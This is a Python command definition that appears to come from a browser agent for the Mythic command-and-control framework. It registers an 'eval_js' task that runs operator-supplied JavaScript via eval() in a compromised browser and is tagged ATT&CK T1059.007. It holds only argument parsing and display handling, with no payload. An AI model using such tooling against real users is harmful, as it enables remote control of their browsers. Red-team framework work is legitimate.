from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *


class EvalJsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="code",
                type=ParameterType.String,
                description="JavaScript code to execute in the browser context"
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise ValueError("Must supply JavaScript code to execute")
        self.add_arg("code", self.command_line)

    async def parse_dictionary(self, dictionary_arguments):
        self.load_args_from_dictionary(dictionary_arguments)

class EvalJsCommand(CommandBase):
    cmd = "eval_js"
    needs_admin = False
    help_cmd = "eval_js {code}"
    description = "Execute JavaScript in the browser context via eval() and return the result."
    version = 1
    author = "@grampae"
    attackmapping = ["T1059.007"]
    argument_class = EvalJsArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Browser]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        code = task.args.get_arg("code")
        if len(code) > 80:
            task.display_params = code[:80] + "..."
        else:
            task.display_params = code
        return task

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
